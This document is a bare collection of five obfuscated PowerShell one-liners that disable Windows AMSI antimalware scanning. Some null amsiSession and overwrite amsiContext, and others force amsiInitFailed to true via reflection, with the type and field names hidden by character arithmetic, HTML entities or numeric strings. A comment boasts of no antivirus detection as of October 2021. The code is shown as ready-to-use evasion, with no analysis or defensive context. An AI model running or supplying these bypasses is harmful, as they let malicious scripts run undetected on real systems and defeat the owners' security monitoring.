-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
```powershell
$TZTTGYMX=[System.Runtime.InteropServices.Marshal]::AllocHGlobal((11333-2257));[Ref].Assembly.GetType("System.Management.Automation.$([ChAr](65)+[Char]([BYte]0x6D)+[ChAR](44+71)+[ChAr]([bytE]0x69))Utils").GetField("$([Char]([ByTe]0x61)+[cHaR]([ByTe]0x6D)+[cHAR](2760/24)+[char](27+78))Session", "NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.$([ChAr](65)+[Char]([BYte]0x6D)+[ChAR](44+71)+[ChAr]([bytE]0x69))Utils").GetField("$([Char]([ByTe]0x61)+[cHaR]([ByTe]0x6D)+[cHAR](2760/24)+[char](27+78))Context", "NonPublic,Static").SetValue($null, [IntPtr]$TZTTGYMX);
```
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
```powershell
[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType($([SySteM.net.weBUtIlITy]::htmlDeCOde('&#83;&#121;&#115;&#116;&#101;&#109;&#46;&#82;&#101;&#102;&#108;&#101;&#99;&#116;&#105;&#111;&#110;&#46;&#66;&#105;&#110;&#100;&#105;&#110;&#103;&#70;&#108;&#97;&#103;&#115;')))).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.Type')), [Object]([Ref].Assembly.GetType('System.Management.Automation.'+$([SysTeM.nET.WEButiLIty]::HTmlDeCOdE('&#65;&#109;&#115;&#105;'))+'Utils')),('GetField')).Invoke(''+$([systEm.net.weBuTiLiTY]::HTmLdECOde('&#97;&#109;&#115;&#105;'))+'InitFailed',(('NonPublic,Static') -as [String].Assembly.GetType($([SySteM.net.weBUtIlITy]::htmlDeCOde('&#83;&#121;&#115;&#116;&#101;&#109;&#46;&#82;&#101;&#102;&#108;&#101;&#99;&#116;&#105;&#111;&#110;&#46;&#66;&#105;&#110;&#100;&#105;&#110;&#103;&#70;&#108;&#97;&#103;&#115;'))))).SetValue($null,$True);
``` 
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
```powershell
$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$u))
$field = $assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static')
$field.SetValue($null,$true)
```
--------------------------------------------
```powershell

$cyouegrv=[System.Runtime.InteropServices.Marshal]::AllocHGlobal((9076*4948/4948));[Ref].Assembly.GetType("$([cHAR]([ByTE]0x53)+[CHaR](121+9-9)+[CHar](115+8-8)+[cHaR](116)+[cHar]([byTE]0x65)+[chAR]([BYte]0x6d)+[cHAR](46)+[CHaR]([ByTe]0x4d)+[CHaR](53+44)+[ChAr]([byte]0x6e)+[CHaR]([ByTe]0x61)+[ChaR](103+54-54)+[cHar](101*82/82)+[cHAR]([BYtE]0x6d)+[char](101*62/62)+[Char]([ByTE]0x6e)+[CHar](116)).Automation.$([CHar]([BYte]0x41)+[ChAr]([BytE]0x6d)+[ChaR](115)+[chaR](105*89/89)+[Char](85)+[Char]([ByTE]0x74)+[chAr]([ByTE]0x69)+[chaR](108+27-27)+[CHAr]([bytE]0x73))").GetField("$([cHAr](97)+[chaR](109)+[cHar]([BYTe]0x73)+[chaR]([bYTE]0x69)+[cHar]([bYte]0x53)+[cHAr](101+31-31)+[ChAR](115+34-34)+[cHAR]([byTE]0x73)+[chAr]([bytE]0x69)+[ChaR](111*53/53)+[chaR]([ByTE]0x6e))", "NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("$([cHAR]([ByTE]0x53)+[CHaR](121+9-9)+[CHar](115+8-8)+[cHaR](116)+[cHar]([byTE]0x65)+[chAR]([BYte]0x6d)+[cHAR](46)+[CHaR]([ByTe]0x4d)+[CHaR](53+44)+[ChAr]([byte]0x6e)+[CHaR]([ByTe]0x61)+[ChaR](103+54-54)+[cHar](101*82/82)+[cHAR]([BYtE]0x6d)+[char](101*62/62)+[Char]([ByTE]0x6e)+[CHar](116)).Automation.$([CHar]([BYte]0x41)+[ChAr]([BytE]0x6d)+[ChaR](115)+[chaR](105*89/89)+[Char](85)+[Char]([ByTE]0x74)+[chAr]([ByTE]0x69)+[chaR](108+27-27)+[CHAr]([bytE]0x73))").GetField("$([chaR]([byTe]0x61)+[chAR]([bYte]0x6d)+[Char]([byTe]0x73)+[cHaR]([ByTe]0x69)+[cHaR](43+24)+[cHAR]([BYte]0x6f)+[ChAR]([bYTe]0x6e)+[ChAr]([byTe]0x74)+[Char]([bYTE]0x65)+[char](120)+[cHaR]([Byte]0x74))", "NonPublic,Static").SetValue($null, [IntPtr]$cyouegrv);

#(09/06/2021)
```
------------
```powershell

#Twitter: @TihanyiNorbert  (No AV detecetion 2021 October)
#Based on the original work of  Matt Graeber @mattifestation 'amsiInitFailed' script.
$A="5492868772801748688168747280728187173688878280688776828"
$B="1173680867656877679866880867644817687416876797271"
[Ref].Assembly.GetType([string](0..37|%{[char][int](29+($A+$B).
substring(($_*2),2))})-replace " " ).
GetField([string](38..51|%{[char][int](29+($A+$B).
substring(($_*2),2))})-replace " ",'NonPublic,Static').
SetValue($null,$true)

```
